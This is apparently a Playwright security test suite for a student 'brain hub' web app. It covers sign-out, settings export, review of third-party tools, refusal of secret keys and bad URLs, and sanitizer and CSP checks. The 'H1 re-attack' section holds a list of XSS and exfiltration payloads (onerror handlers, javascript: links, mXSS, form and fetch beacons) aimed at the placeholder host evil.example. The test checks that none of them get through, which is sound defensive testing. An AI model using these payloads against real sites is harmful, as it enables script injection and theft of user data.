// Second sign-off pass: PLAN "Amendments after Nitpick's sign-off review",
// re-attacked. Runs in all three projects.
import { test, expect } from '../helpers/fixtures.mjs'
import { STUDENT, BRAIN_URL } from '../helpers/fake-brain.mjs'
import { FREE_IDS } from '../helpers/fake-openrouter.mjs'
import { PRIVACY_WARNING, PERMISSION_TEXT } from '../helpers/contract.mjs'
import { GH_TOOL, REQUIRED_TOOL, NONE_TOOL } from '../helpers/recipes.mjs'
import { tid, setup, openTool, fillHello, setHash, toBrainStep, submitBrain, installRecipe } from '../helpers/hub.mjs'

const tile = (page, id) => tid(page, 'tool-tile').and(page.locator(`[data-tool-id="${id}"]`))
const lsKeys = (page) => page.evaluate(() => Object.keys(localStorage).sort())

async function setOverride(page, value) {
  await setHash(page, '#/settings')
  await expect(tid(page, 'screen-settings')).toBeVisible()
  await tid(page, 'settings-repo-override').fill(value)
  await tid(page, 'settings-repo-override').press('Enter')
  await tid(page, 'settings-repo-override').blur()
  await setHash(page, '#/home')
  await expect(tid(page, 'screen-home')).toBeVisible()
}

test('M1: sign-out clears hub.runs.* and the session, and calls auth/v1/logout', async ({ page, brain }) => {
  await setup(page, { brain: 'connect', mode: 'manual' })
  await openTool(page, 'hello-hub')
  await fillHello(page)
  await tid(page, 'run-btn').click()
  await expect(tid(page, 'prompt-box')).toBeVisible()
  expect(await lsKeys(page)).toContain('hub.runs.hello-hub')
  const token = (await page.evaluate(() => JSON.parse(localStorage.getItem('hub.session')))).access_token
  await tid(page, 'nav-settings-top').click()
  await tid(page, 'settings-signout').click()
  await expect.poll(() => brain.requests((e) => e.path === '/auth/v1/logout').length).toBe(1)
  const logout = brain.requests((e) => e.path === '/auth/v1/logout')[0]
  expect(logout.method).toBe('POST')
  expect(logout.headers.authorization).toBe(`Bearer ${token}`)
  const keys = await lsKeys(page)
  expect(keys.filter((k) => k.startsWith('hub.runs.'))).toEqual([])
  expect(keys).not.toContain('hub.session')
})

test('M2: settings export holds exactly hub.settings, hub.brain and hub.localTools', async ({ page }) => {
  await setup(page, { brain: 'connect', mode: 'auto' })
  await installRecipe(page, NONE_TOOL)
  await openTool(page, 'hello-hub')
  await fillHello(page)
  await tid(page, 'run-btn').click()
  await expect(tid(page, 'result')).toBeVisible()
  await tid(page, 'nav-settings-top').click()
  const [dl] = await Promise.all([page.waitForEvent('download'), tid(page, 'settings-export').click()])
  const chunks = []; for await (const c of await dl.createReadStream()) chunks.push(c)
  const data = JSON.parse(Buffer.concat(chunks).toString('utf8'))
  expect(Object.keys(data).sort()).toEqual(['hub.brain', 'hub.localTools', 'hub.settings'])
  expect(Object.keys(data['hub.brain']).sort()).toEqual(['anonKey', 'url'])
  expect(JSON.stringify(data)).not.toContain('Pricing notes') // brain notes from the run
})

test('M3: Automatic setup shows the privacy warning', async ({ page }) => {
  await toBrainStep(page)
  await tid(page, 'brain-skip').click()
  await tid(page, 'ai-mode-auto').click()
  await expect(tid(page, 'auto-privacy-warning')).toBeVisible()
  await expect(tid(page, 'auto-privacy-warning')).toContainText(PRIVACY_WARNING)
  await tid(page, 'ai-mode-manual').click()
  await expect(tid(page, 'auto-privacy-warning')).toBeHidden()
})

test.describe('M5: tools from a repo override need review', () => {
  test('tool-review first, tool-accept lets it through, and the acceptance is remembered', async ({ page, github }) => {
    github.repo('carol', 'hub', { 'gh-tool.recipe.md': GH_TOOL })
    await setup(page)
    await setOverride(page, 'carol/hub')
    await tile(page, 'gh-tool').click()
    await expect(tid(page, 'tool-review')).toBeVisible()
    await expect(tid(page, 'tool-review')).toContainText('carol/hub')
    await expect(tid(page, 'tool-review').getByTestId('summary-permissions')).toContainText(PERMISSION_TEXT.run_ai)
    await expect(tid(page, 'run-btn')).toHaveCount(0)
    await expect(tid(page, 'field-thing')).toHaveCount(0)
    await tid(page, 'tool-accept').click()
    await expect(tid(page, 'field-thing')).toBeVisible()
    await page.reload()
    await expect(tid(page, 'field-thing')).toBeVisible()
    await expect(tid(page, 'tool-review')).toHaveCount(0)
  })

  test('no override (the student’s own plugins/): no review', async ({ page, context }) => {
    await context.route('http://localhost:4173/brain-hub/plugins/plugins.json', (r) =>
      r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ recipes: ['gh-tool.recipe.md'] }) }))
    await context.route('http://localhost:4173/brain-hub/plugins/gh-tool.recipe.md', (r) =>
      r.fulfill({ status: 200, contentType: 'text/markdown', body: GH_TOOL }))
    await setup(page)
    await tile(page, 'gh-tool').click()
    await expect(tid(page, 'field-thing')).toBeVisible()
    await expect(tid(page, 'tool-review')).toHaveCount(0)
  })

  test('an accepted tool that later asks for more permissions (same version) is reviewed again', async ({ page, github }) => {
    github.repo('carol', 'hub', { 'gh-tool.recipe.md': GH_TOOL })
    await setup(page, { brain: 'connect', mode: 'manual' })
    await setOverride(page, 'carol/hub')
    await tile(page, 'gh-tool').click()
    await tid(page, 'tool-accept').click()
    await expect(tid(page, 'field-thing')).toBeVisible()
    // Same id and version, but now it reads the brain.
    const escalated = GH_TOOL.replace('permissions: [run_ai]', 'permissions: [search_brain, run_ai]')
      .replace('output:', 'brain_context:\n  query: "passwords bank account"\n  limit: 10\noutput:')
    github.repo('carol', 'hub', { 'gh-tool.recipe.md': escalated })
    await setHash(page, '#/home')
    await tid(page, 'refresh-tools').click()
    await tile(page, 'gh-tool').click()
    await expect(tid(page, 'tool-review'), 'changed permissions must be reviewed again').toBeVisible()
  })

  test('acceptance for one repo does not carry over to another repo’s tool with the same id and version', async ({ page, github }) => {
    github.repo('carol', 'hub', { 'gh-tool.recipe.md': GH_TOOL })
    github.repo('mallory', 'hub', { 'gh-tool.recipe.md': GH_TOOL.replace('Tell me about {{thing}}.', 'Different author, different prompt: {{thing}}.') })
    await setup(page)
    await setOverride(page, 'carol/hub')
    await tile(page, 'gh-tool').click()
    await tid(page, 'tool-accept').click()
    await expect(tid(page, 'field-thing')).toBeVisible()
    await setOverride(page, 'mallory/hub')
    await tile(page, 'gh-tool').click()
    await expect(tid(page, 'tool-review'), 'a different repo is a different author').toBeVisible()
  })
})

test.describe('L7/L8: refused before any request', () => {
  test('L7: a brain address that is not https://*.supabase.co', async ({ page, brain, net }) => {
    for (const bad of ['https://my-brain.example.com', 'http://abc.supabase.co', 'https://abc.supabase.co.evil.example']) {
      await toBrainStep(page)
      await tid(page, 'brain-url').fill(bad)
      await tid(page, 'brain-key').fill('sb_publishable_x')
      await tid(page, 'brain-email').fill(STUDENT.email)
      await tid(page, 'brain-password').fill(STUDENT.password)
      await tid(page, 'brain-connect').click()
      await expect(tid(page, 'brain-status')).toContainText('supabase.co')
      await expect(tid(page, 'brain-password')).toHaveValue('')
      await expect(tid(page, 'ai-mode-auto')).toBeHidden()
    }
    expect(brain.requests()).toEqual([])
    expect(net.requests.filter((r) => !r.url.startsWith('http://localhost:4173/'))).toEqual([])
  })

  const b64url = (o) => Buffer.from(JSON.stringify(o)).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  const serviceJwt = `${b64url({ alg: 'HS256', typ: 'JWT' })}.${b64url({ iss: 'supabase', ref: 'fake-brain', role: 'service_role' })}.c2ln`
  for (const [label, key] of [['sb_secret_ key', 'sb_secret_fakeE2E0000'], ['service_role JWT', serviceJwt]]) {
    test(`L8: ${label} is refused with its own message, before any request`, async ({ page, brain, net }) => {
      await toBrainStep(page)
      await tid(page, 'brain-url').fill(BRAIN_URL)
      await tid(page, 'brain-key').fill(key)
      await tid(page, 'brain-email').fill(STUDENT.email)
      await tid(page, 'brain-password').fill(STUDENT.password)
      await tid(page, 'brain-connect').click()
      await expect(tid(page, 'brain-refused')).toBeVisible()
      await expect(tid(page, 'brain-refused')).toContainText(/secret key/i)
      await expect(tid(page, 'brain-refused')).not.toContainText(/is open/i)
      await expect(tid(page, 'brain-password')).toHaveValue('')
      expect(brain.requests()).toEqual([])
      expect(net.requests.filter((r) => r.url.includes(key))).toEqual([])
      expect(await page.evaluate(() => JSON.stringify(localStorage))).not.toContain(key)
    })
  }
})

test.describe('L1: local date', () => {
  test.use({ timezoneId: 'America/Mexico_City' })
  test('at 20:00 in Mexico City (already tomorrow in UTC), {{today}} and the download use the local date', async ({ page }) => {
    await page.clock.setFixedTime(new Date('2026-10-04T02:00:00Z')) // 2026-10-03 20:00 local
    expect(await page.evaluate(() => new Date().toISOString().slice(0, 10))).toBe('2026-10-04')
    await setup(page, { mode: 'manual' })
    await installRecipe(page, REQUIRED_TOOL)
    await openTool(page, 'company-news')
    await tid(page, 'field-company').fill('Acme')
    await tid(page, 'run-btn').click()
    const prompt = await tid(page, 'prompt-box').inputValue()
    expect(prompt).toContain('as of 2026-10-03.')
    expect(prompt).not.toContain('2026-10-04')
    await tid(page, 'answer-box').fill('## Latest news\n- x [s](https://example.com/s)\n## What it means\n- y\n## Summary\nz')
    await tid(page, 'use-answer').click()
    const [dl] = await Promise.all([page.waitForEvent('download'), tid(page, 'download-btn').click()])
    expect(dl.suggestedFilename()).toBe('company-news-2026-10-03.md')
  })
})

test('L5: archiving a row that no longer exists is not reported as done', async ({ page, brain }) => {
  await setup(page, { brain: 'connect', mode: 'auto' })
  await openTool(page, 'hello-hub')
  await fillHello(page)
  await tid(page, 'run-btn').click()
  await tid(page, 'save-btn').click()
  await tid(page, 'save-confirm').click()
  await expect.poll(() => brain.hubRows().length).toBe(1)
  await setHash(page, '#/home')
  const item = tid(page, 'recent-item').first()
  await expect(item).toBeVisible()
  brain.rows.splice(brain.rows.indexOf(brain.hubRows()[0]), 1) // deleted elsewhere
  await item.getByTestId('archive-btn').click()
  await expect.poll(() => brain.requests((e) => e.method === 'PATCH').length).toBe(1)
  await expect(item).toBeVisible()
  await expect(item.getByTestId('archive-btn')).toBeEnabled()
})

test('L6: a hidden duplicate is reported with tool-conflict', async ({ page, context }) => {
  const dup = NONE_TOOL.replace('id: tidy-text', 'id: hello-hub')
  await context.route('http://localhost:4173/brain-hub/plugins/plugins.json', (r) =>
    r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ recipes: ['hello-hub.recipe.md'] }) }))
  await context.route('http://localhost:4173/brain-hub/plugins/hello-hub.recipe.md', (r) =>
    r.fulfill({ status: 200, contentType: 'text/markdown', body: dup }))
  await setup(page)
  await expect(tid(page, 'tool-conflict')).toBeVisible()
  await expect(tid(page, 'tool-conflict')).toContainText('hello-hub')
  await expect(tile(page, 'hello-hub')).toHaveCount(1)
  await expect(tile(page, 'hello-hub')).toContainText('Hello Hub')
})

test('L2: a malformed tool link shows "Tool not found" instead of a blank screen', async ({ page }) => {
  await setup(page)
  await setHash(page, '#/tool/%E0%A4%A')
  await expect(tid(page, 'screen-tool')).toContainText('Tool not found')
})

test('L3: after switching to copy-and-paste on an error, the next Run goes back to Automatic', async ({ page, openrouter }) => {
  openrouter.script(FREE_IDS[0], [401, 'ok'])
  await setup(page, { mode: 'auto' })
  await openTool(page, 'hello-hub')
  await fillHello(page)
  await tid(page, 'run-btn').click()
  await tid(page, 'run-error').getByTestId('switch-to-manual').click()
  await expect(tid(page, 'prompt-box')).toBeVisible()
  await tid(page, 'run-btn').click()
  await expect(tid(page, 'result')).toBeVisible()
  expect(openrouter.chats()).toHaveLength(2)
})

// ---------------------------------------------------------------- H1 re-attack

const ATTACK = [
  '## Key points',
  '- legit [source](https://example.com/legit)',
  '![md image](https://evil.example/md-img?d=brain-note)',
  '![ref image][r]',
  '[r]: https://evil.example/ref-img',
  '![js image](javascript:window.__pwned=1)',
  '<img src="https://evil.example/raw-img" onerror="window.__pwned=2">',
  '<img srcset="https://evil.example/srcset 1x">',
  '<picture><source srcset="https://evil.example/picture"><img alt=p></picture>',
  '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/svg-image"/><script>window.__pwned=3</script></svg>',
  '<svg onload="window.__pwned=4"></svg>',
  '<math><mtext><table><mglyph><style><img src="https://evil.example/mxss" onerror="window.__pwned=5">',
  '<noscript><p title="</noscript><img src=https://evil.example/noscript onerror=window.__pwned=6>"></noscript>',
  '<style>@import url(https://evil.example/import.css); body{background:url(https://evil.example/style-bg)}</style>',
  '<div style="background-image:url(https://evil.example/inline-style)">styled</div>',
  '<link rel="stylesheet" href="https://evil.example/link.css"><link rel="prefetch" href="https://evil.example/prefetch">',
  '<form action="https://evil.example/form"><input name="password" type="password"><button>Re-enter password</button></form>',
  '<button formaction="https://evil.example/formaction">go</button>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example/meta-refresh">',
  '<base href="https://evil.example/">',
  '<iframe src="https://evil.example/iframe"></iframe><object data="https://evil.example/object"></object><embed src="https://evil.example/embed">',
  '<video poster="https://evil.example/poster" src="https://evil.example/video"></video><audio src="https://evil.example/audio" autoplay></audio>',
  '<table background="https://evil.example/table-bg"><tr><td>t</td></tr></table>',
  '<a href="https://example.com/x" ping="https://evil.example/ping">ping link</a>',
  '<details open ontoggle="window.__pwned=7"><summary>d</summary></details>',
  '[js link](javascript:window.__pwned=8)',
  '<a href=" javascript:window.__pwned=9">spaced js</a>',
  '<a href="vbscript:msgbox(1)">vb</a>',
  '[data link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '<a href="data:text/html,<script>alert(1)</script>">data html</a>',
  '<input type="image" src="https://evil.example/input-image">',
  '## Next steps', '- x', '## Summary', 'y',
].join('\n')

test.describe('H1 re-attack', () => {
  test.use({ cspStrict: false })

  test('sanitizer layer: nothing in an AI answer can load, run, submit or navigate on its own', async ({ page, net, cspViolations }) => {
    await setup(page, { mode: 'manual' })
    await openTool(page, 'hello-hub')
    await fillHello(page)
    await tid(page, 'run-btn').click()
    await tid(page, 'answer-box').fill(ATTACK)
    await tid(page, 'use-answer').click()
    const result = tid(page, 'result')
    await expect(result).toBeVisible()
    await expect(result.locator('a[href="https://example.com/legit"]')).toBeVisible() // legit content survives
    const audit = await result.evaluate((root) => {
      const bad = []
      // The hub's own "Copy section" button sits in a row right after each h2
      // (Builder & Tester). Only those exact elements are exempt; any other
      // button, including one claiming the same data-testid, is still flagged.
      const hubOwned = new Set()
      for (const h2 of root.querySelectorAll('h2')) {
        const row = h2.nextElementSibling
        if (row?.matches('div.row') && row.children.length === 2 && row.firstElementChild.matches('button.ghost[data-testid="copy-section"]')) {
          hubOwned.add(row); hubOwned.add(row.firstElementChild); hubOwned.add(row.lastElementChild)
        }
      }
      const forbidden = 'img,picture,source,video,audio,svg,math,style,link,meta,base,iframe,frame,object,embed,form,input,button,textarea,select,script,noscript'
      for (const el of root.querySelectorAll(forbidden)) if (!hubOwned.has(el)) bad.push(`tag <${el.tagName.toLowerCase()}>`)
      for (const el of root.querySelectorAll('*')) {
        for (const a of el.attributes) {
          if (/^on/i.test(a.name)) bad.push(`event attr ${a.name}`)
          if (['style', 'srcset', 'ping', 'background', 'poster', 'action', 'formaction', 'src'].includes(a.name)) bad.push(`attr ${a.name} on <${el.tagName.toLowerCase()}>`)
          if (['href', 'xlink:href'].includes(a.name) && !/^(https?:|mailto:|#)/i.test(a.value.trim())) bad.push(`href ${a.value.slice(0, 40)}`)
        }
      }
      return bad
    })
    expect(audit, 'dangerous markup survived sanitising').toEqual([])
    // Let any load be attempted, then check nothing left the app.
    await page.evaluate(() => new Promise((r) => requestAnimationFrame(() => setTimeout(r, 100))))
    expect(net.requests.filter((r) => r.url.includes('evil.example')).map((r) => r.url)).toEqual([])
    expect(await page.evaluate(() => window.__pwned)).toBeUndefined()
    expect(page.url()).toContain('localhost:4173/brain-hub/')
    // The sanitizer alone handled it: nothing that loads, connects, runs or submits hit the CSP.
    // (Chromium reports inline-style and base-uri violations while DOMPurify parses the answer in
    // its inert document; nothing loads there, so those two are tolerated as noise.)
    expect(cspViolations.filter((v) => !/style-src|inline style|base-uri|base URI/i.test(v))).toEqual([])
    // Images became plain links, not loads.
    await expect(result).toContainText('[image: md image]')
  })

  test('CSP layer: even markup that skipped the sanitizer cannot reach another server', async ({ page, net, cspViolations, browserName }) => {
    await setup(page, { mode: 'manual' })
    await page.evaluate(() => {
      const box = document.createElement('div')
      document.body.append(box)
      box.innerHTML = '<img src="https://evil.example/csp-img"><div style="background:url(https://evil.example/csp-inline)">s</div>'
      const st = document.createElement('style'); st.textContent = 'body{background:url(https://evil.example/csp-style)}'; document.head.append(st)
      const sc = document.createElement('script'); sc.textContent = 'window.__pwned = "inline-script"'; document.body.append(sc)
      fetch('https://evil.example/csp-fetch').catch(() => {})
      try { navigator.sendBeacon('https://evil.example/csp-beacon', 'x') } catch {}
      new Image().src = 'https://evil.example/csp-new-image'
      const f = document.createElement('form'); f.action = 'https://evil.example/csp-form'; f.method = 'post'; document.body.append(f)
      try { f.submit() } catch {}
    })
    await page.evaluate(() => new Promise((r) => setTimeout(r, 300)))
    // Chromium emits a Playwright 'request' event even for loads the CSP blocked, so the proof that
    // nothing left is the route-level guard: a request that reached the network would be recorded there.
    expect(net.violations.filter((x) => x.includes('evil.example')), 'CSP let a request reach the network').toEqual([])
    expect(await page.evaluate(() => window.__pwned), 'inline script ran').toBeUndefined()
    expect(page.url()).toContain('localhost:4173/brain-hub/')
    const v = cspViolations.join('\n')
    for (const d of ['img-src', 'connect-src', 'script-src']) expect(v, `no ${d} violation recorded (${browserName})`).toContain(d)
    net.violations.splice(0, net.violations.length, ...net.violations.filter((x) => !x.includes('evil.example')))
  })
})

test('CSP breaks nothing: the full Automatic flow with a brain records no CSP violations', async ({ page, cspViolations }) => {
  await setup(page, { brain: 'connect', mode: 'auto' })
  await openTool(page, 'hello-hub')
  await fillHello(page)
  await tid(page, 'run-btn').click()
  await expect(tid(page, 'result')).toBeVisible()
  await tid(page, 'save-btn').click()
  await tid(page, 'save-confirm').click()
  await expect(tid(page, 'save-status')).toBeVisible()
  await Promise.all([page.waitForEvent('download'), tid(page, 'download-btn').click()])
  await tid(page, 'nav-home').click()
  await expect(tid(page, 'recent-item').first()).toBeVisible()
  await tid(page, 'nav-add').click()
  await tid(page, 'nav-settings-top').click()
  await expect(tid(page, 'screen-settings')).toBeVisible()
  expect(cspViolations).toEqual([]) // also enforced for every other test by the fixture
})
